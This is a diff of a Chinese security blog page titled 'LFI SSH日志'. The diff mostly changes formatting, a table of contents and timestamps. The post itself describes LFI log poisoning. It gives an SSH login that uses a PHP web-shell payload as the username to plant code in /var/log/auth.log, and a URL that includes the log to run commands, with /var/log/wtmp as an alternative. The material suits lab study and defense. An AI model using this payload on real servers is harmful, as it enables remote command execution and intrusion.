@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="登陆SSH： ssh &amp;apos;&amp;lt;?php system($_GET[‘c’]); ?&amp;gt;&amp;apos;@192.168.1.105包含文件： http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;amp;c=ls/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的">
+<meta name="description" content="登陆SSH：ssh &amp;apos;&amp;lt;?php system($_GET[‘c’]); ?&amp;gt;&amp;apos;@192.168.1.105包含文件：http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;amp;c=ls/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的效果">
 <meta property="og:type" content="article">
 <meta property="og:title" content="LFI SSH日志">
 <meta property="og:url" content="http://MaiKeFee.com/archives/8946a683.html">
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:description" content="登陆SSH： ssh &amp;apos;&amp;lt;?php system($_GET[‘c’]); ?&amp;gt;&amp;apos;@192.168.1.105包含文件： http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;amp;c=ls/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的">
+<meta property="og:description" content="登陆SSH：ssh &amp;apos;&amp;lt;?php system($_GET[‘c’]); ?&amp;gt;&amp;apos;@192.168.1.105包含文件：http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;amp;c=ls/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的效果">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-27T15:14:42.262Z">
+<meta property="og:updated_time" content="2019-08-28T08:50:48.663Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="LFI SSH日志">
-<meta name="twitter:description" content="登陆SSH： ssh &amp;apos;&amp;lt;?php system($_GET[‘c’]); ?&amp;gt;&amp;apos;@192.168.1.105包含文件： http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;amp;c=ls/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的">
+<meta name="twitter:description" content="登陆SSH：ssh &amp;apos;&amp;lt;?php system($_GET[‘c’]); ?&amp;gt;&amp;apos;@192.168.1.105包含文件：http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;amp;c=ls/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的效果">
 
 
 
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T23:14:42+08:00">
-                2019-08-27
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T16:50:48+08:00">
+                2019-08-28
               </time>
             
           </span>
@@ -439,9 +439,7 @@
       
 
       
-        <p>登陆SSH：</p>
-<pre><code>ssh &apos;&lt;?php system($_GET[‘c’]); ?&gt;&apos;@192.168.1.105</code></pre><p>包含文件：</p>
-<pre><code>http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;c=ls</code></pre><p>/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的效果。有16字符可控，足够了。 只可以没有x权限，要不然ssrf fastcgi就有意思了。</p>
+        <h4 id="登陆SSH："><a href="#登陆SSH：" class="headerlink" title="登陆SSH："></a>登陆SSH：</h4><pre><code>ssh &apos;&lt;?php system($_GET[‘c’]); ?&gt;&apos;@192.168.1.105</code></pre><h4 id="包含文件："><a href="#包含文件：" class="headerlink" title="包含文件："></a>包含文件：</h4><pre><code>http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;c=ls</code></pre><p>/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的效果。有16字符可控，足够了。 只可以没有x权限，要不然ssrf fastcgi就有意思了。</p>
 
       
     </div>
@@ -533,8 +531,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -603,6 +610,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#登陆SSH："><span class="nav-number">1.</span> <span class="nav-text">登陆SSH：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含文件："><span class="nav-number">2.</span> <span class="nav-text">包含文件：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
